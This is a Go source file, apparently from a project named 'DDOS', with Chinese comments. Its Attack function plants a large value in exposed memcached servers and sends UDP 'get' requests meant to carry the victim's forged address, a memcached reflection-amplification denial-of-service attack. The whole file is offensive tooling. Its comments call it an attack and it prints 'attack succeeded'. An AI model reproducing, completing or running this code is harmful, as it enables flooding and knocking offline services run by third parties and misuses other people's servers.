package util

import (
	"DDOS/entity"
	"fmt"
	"net"

	"github.com/bradfitz/gomemcache/memcache"
)

//Attack 发送 memcached 攻击
func Attack(targetIP string, targetPort int, item entity.IPPort) {
	//这里还需要,通过ip和port先去写入数据
	canConnect, Client := ConnectAndTestIsActive(item.ToString())
	if canConnect {
		//先写入ddos输入，存活时间900s
		err := Client.Set(&memcache.Item{Key: "ddos", Value: []byte("abcddsjdaskldjaklsdklasdjklajdlkajdlkajdkladklakdaldalkdjklasjdajdajdlkasdjlkasdjlkasjdlkajdlkajdajdjasldjaslkdjaklsdjalskjdlaksjdlkajdkladjlkasjdakdjlkajdakdjaklsd")})
		if err == nil {
			//设置成功了，就可以伪造攻击头信息
			localIP := net.ParseIP(targetIP)
			remoteIP := net.ParseIP(item.IP)
			lAddr := &net.UDPAddr{IP: localIP, Port: targetPort}
			rAddr := &net.UDPAddr{IP: remoteIP, Port: item.Port}
			conn, err := net.DialUDP("udp", lAddr, rAddr)
			if err != nil {
				fmt.Printf("Attack connectServer error:%v\n", err)
				return
			}
			defer conn.Close()
			//发送数据
			data := "\x00\x00\x00\x00\x00\x01\x00\x00get ddos\r\n"
			_, writeErr := conn.Write([]byte(data))
			if writeErr != nil {
				fmt.Println("发送数据失败，err:", err)
				return
			}
			fmt.Printf("%v 攻击 %v:%v 成功\n", item.ToString(), targetIP, targetPort)
		}
	} else {
		return
	}
}
